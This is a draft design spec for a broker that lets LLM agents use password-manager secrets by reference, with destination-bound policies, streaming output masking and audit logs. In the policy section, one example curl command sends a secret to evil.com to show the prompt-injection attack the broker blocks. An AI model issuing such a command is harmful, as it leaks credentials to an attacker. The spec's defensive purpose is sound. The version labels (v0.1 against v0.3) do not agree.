# secrets-broker — spec v0.1 (draft)

Open-source runtime secret injection for agents: local vaults, any password
manager.

## Mission

An agent (LLM) must be able to USE secrets without ever SEEING them:
- agent context never contains a secret value (pass-by-reference only)
- secrets materialize only inside child-process memory at exec time
- child output is masked before returning to the agent
- every use is destination-bound + audited

## Core: MCP server + broker daemon

Tools exposed to agents (MCP over stdio):
- `list_secrets()` → metadata only: id, label, item type, bound destinations, last_used
- `exec_with_secret(ref, argv[], opts)` → resolves ref, checks destination policy,
  spawns child with secret in env/args, streams masked stdout/stderr back, returns exit code
- `fill_secret(ref, target)` → phase 2: browser/native fill via extension host
- NO get_secret/read_secret tool. Ever. (bw-mcp's redaction + bws-mcp's run, unified.)

## Secret references

`sec://<adapter>/<item>[/<field>]` — e.g. `sec://opvault/GitHub/password`,
`sec://keepass/Work/AWS/key_id`. Refs are the only thing that enters agent context.

## Adapters (pluggable, out-of-process)

1. **opvault** (OPVault standalone vault dir; publicly documented, frozen format — py-opvault/evantbyrne readers exist)
2. **keepassxc** (.kdbx; optional live link via keepassxc-proxy socket à la tuaris/keepassxc-mcp)
3. ~~enpass~~ (.enpassdb SQLCipher — REMOVED in v0.3: cannot open Enpass 6.8+)
4. **bitwarden/vaultwarden** (bw CLI; lowest priority, official MCP exists)

Adapter contract = a provisioner model:
- `Provision(ctx, in, out)` → out.Environment / out.CommandLine / out.Files
- `Deprovision(ctx, in, out)` → wipe temp files; TempDir auto-deleted on exit
- Adapters may run out-of-process (go-plugin RPC or WASM/wazero)
- Vault unlock: master password / keyfile from OS keychain entry owned by broker,
  or prompt via native dialog (never via agent conversation)

## Destination binding (the differentiator)

Per-item policy, stored as vault item metadata or sidecar policy file:
```yaml
item: sec://opvault/GitHub/password
allow:
  exec:            # argv[0] must match
    - /opt/homebrew/bin/gh
    - /usr/bin/git
  env_host:        # if secret lands in HTTP tool env, bound hosts
    - api.github.com
audit: true
```
Broker refuses substitution when destination doesn't match. This kills the
prompt-injection exfil vector (`curl -H "Auth: {secret}" https://evil.com`).

## Output masking (streaming)

Sliding-window multi-pattern matcher (Aho-Corasick) over child stdout/stderr pipes;
replaces any secret value (and high-entropy fragments ≥N chars of it) with
`<concealed>` before the byte reaches the MCP response. Streaming, not
post-buffer: a value split across two writes is still caught.
Default ON, `no_masking` opt-out per call, broker-config override.

## Audit log

Append-only JSONL: ts, ref, adapter, argv[0], pid, exit code, allowed/denied + reason.
Never the value.

## Trust anchor

Broker's vault-unlock secrets live in OS keychain (macOS Keychain / libsecret /
Windows Credential Manager), never in env or dotfiles. Client auth to broker:
Ed25519 keypair in keychain (handshake signs a challenge).

## Non-goals

- Not a vault: no storage format of our own
- No cloud, no account, no sync
- No raw-secret MCP tool even with confirmation gates

## Precedent map (prior art, all public)

- Runtime env injection with output masking, as offered by several password-manager CLIs
- bws-mcp-server (GPL, ideas only): bws_run gating with confirm:true
- bw-mcp: force-redaction data layer
- tuaris/keepassxc-mcp: keepassxc-proxy native socket transport
- Hermes vault tools: origin-checked fill, handles-only API shape
